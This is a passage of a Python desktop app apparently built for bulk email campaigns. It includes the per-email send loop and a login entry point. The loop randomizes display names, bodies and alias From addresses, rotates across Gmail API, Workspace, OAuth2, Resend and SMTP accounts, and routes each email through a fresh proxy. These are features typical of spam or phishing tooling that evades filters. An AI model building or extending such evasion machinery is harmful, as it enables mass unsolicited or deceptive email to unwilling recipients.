                if alias_from == sender["email"]:
                    alias_from = None
                
                # 👤 RANDOM DISPLAY NAME (per email) — personalize ila fih [NAME]
                final_display_name = self._get_random_display_name()
                final_display_name = self._personalize_content(final_display_name, lead)
                
                # 📄 RANDOM BODY TEMPLATE (per email wla per batch)
                final_body = self._get_random_body(i)
                
                # 🆕 V87: Resolve real From email for Resend (placeholder → actual)
                actual_sender_email = sender["email"]
                if sender["type"] == "resend" and sender["email"] in ("__RESEND_AUTOGEN__", "__RESEND_CUSTOM__"):
                    actual_sender_email = self._get_resend_from_email()
                    if not actual_sender_email:
                        # Fallback to single field
                        actual_sender_email = self.resend_from_email.get().strip() if hasattr(self, 'resend_from_email') else ""
                    if not actual_sender_email:
                        raise Exception("Resend: failed to get From email")
                
                msg = self._build_mime(
                    actual_sender_email, final_display_name, lead,
                    subject, final_body, att_path,
                    alias_from=alias_from)

                if sender["type"] == "api":
                    # Fresh proxy + fresh service for each email
                    fresh_svc, proxy = self._get_fresh_api_service(sender["email"])
                    self._send_via_api(fresh_svc, msg)
                    proxy_info = f" 🌐 {proxy['host']}:{proxy['port']}" if proxy else ""
                elif sender["type"] == "workspace_smtp":
                    proxy_used = self._send_via_workspace_smtp(sender["email"], msg)
                    proxy_info = f" 🌐 {proxy_used}" if proxy_used != "direct" else ""
                elif sender["type"] == "oauth2_smtp":
                    proxy_used = self._send_via_oauth2_smtp(sender["email"], sender["creds"], msg)
                    proxy_info = f" 🌐 {proxy_used}" if proxy_used != "direct" else ""
                elif sender["type"] == "resend":
                    # 📨 Resend API (m3a actual_sender_email already in msg)
                    self._send_via_resend(msg, lead)
                    # Apply rate limit delay
                    delay_ms = self._get_resend_delay_ms()
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)
                    proxy_info = f" 📨 {actual_sender_email}"
                else:
                    proxy_used = self._send_via_smtp(sender["cfg"], msg)
                    proxy_info = f" 🌐 {proxy_used}" if proxy_used != "direct" else ""
                    with counter_lock:
                        maxed = self.smtp_tab.increment_smtp(sender["cfg"], sender["iid"])
                        if maxed:
                            self._log(f"🗑 {sender['email']} reached {limit} — removed", C["yellow"])

                with counter_lock:
                    sent_c[0] += 1
                    self.sent_total_value += 1
                    self._save_sent_total()
                    current_sent_total = self.sent_total_value
                att_name = os.path.basename(att_path) if att_path else "—"
                
                # Show alias info ila kanat used
                from_display = f"{sender['email']} → {alias_from}" if alias_from and alias_from != sender['email'] else sender['email']
                
                self._log(
                    f"  ✓ [{sender['type'].upper()}] {lead} ← {from_display}{proxy_info} | {subject[:22]} | {att_name}",
                    C["green"])
            except Exception as e:
                with counter_lock:
                    fail_c[0] += 1
                    self._append_failed_email(lead)
                self._log(f"  ✗ {lead}: {str(e)[:65]}", C["red"])

            with counter_lock:
                s, f = sent_c[0], fail_c[0]
                total_sent_saved = self.sent_total_value
            def _upd(s=s, f=f, total_sent_saved=total_sent_saved):
                self.stat_sent.config(text=str(total_sent_saved))
                self.stat_fail.config(text=str(f))
                self.progress["value"] = start_idx + s + f
                self.progress_lbl.config(text=f"{start_idx+s+f}/{total}")
            self.after(0, _upd)

        def _do():
            from concurrent.futures import ThreadPoolExecutor, as_completed
            with ThreadPoolExecutor(max_workers=n_threads) as executor:
                futures = {executor.submit(_send_one, start_idx+i, lead): lead
                           for i, lead in enumerate(leads[start_idx:])}
                for fut in as_completed(futures):
                    if not self._sending:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    try:
                        fut.result()
                    except:
                        pass

            self._sending = False
            self._resume_index = 0
            self.after(0, lambda: self.resume_lbl.config(text=""))
            self.after(0, self._stop_loading_animation)
            self._log(
                f"✔ Done — {sent_c[0]} sent · {fail_c[0]} failed · total saved {self.sent_total_value}",
                C["green"] if fail_c[0]==0 else C["yellow"])

        threading.Thread(target=_do, daemon=True).start()


if __name__ == "__main__":
    # 🔐 LOGIN FLOW — Login lawl, mn ba3d ki-tla7 l'app
    while True:
        user_manager = UserManager()
        login = LoginWindow(user_manager)
        login.mainloop()
        
        # Ila login mafichi (sda klie window) → khrouj
        if not login.authenticated_user:
            break
        
        # Login mzyan → tla7 l'app
        current_user = login.authenticated_user
        app = GmailSenderApp(current_user=current_user, user_manager=user_manager)
        app.mainloop()
        
        # Ila l'user da clic 3la Logout → 3awd login
        if not getattr(app, '_do_relogin', False):
            break
